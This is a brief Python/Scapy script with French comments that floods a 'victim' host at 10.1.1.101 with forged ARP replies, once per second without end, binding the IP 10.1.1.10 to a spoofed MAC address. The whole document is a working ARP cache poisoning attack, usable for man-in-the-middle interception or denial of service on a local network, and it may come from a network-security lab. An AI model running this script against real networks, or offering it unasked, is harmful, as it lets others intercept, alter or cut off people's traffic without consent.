from scapy.all import *
import time

target_ip = "10.1.1.101"   # Machine victime
spoof_ip = "10.1.1.10"   # IP usurpée
spoof_mac = "00:15:5d:01:01:01"  # MAC falsifiée

while True:
	packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwsrc=spoof_mac)
	send(packet, verbose = True)
	time.sleep(1)
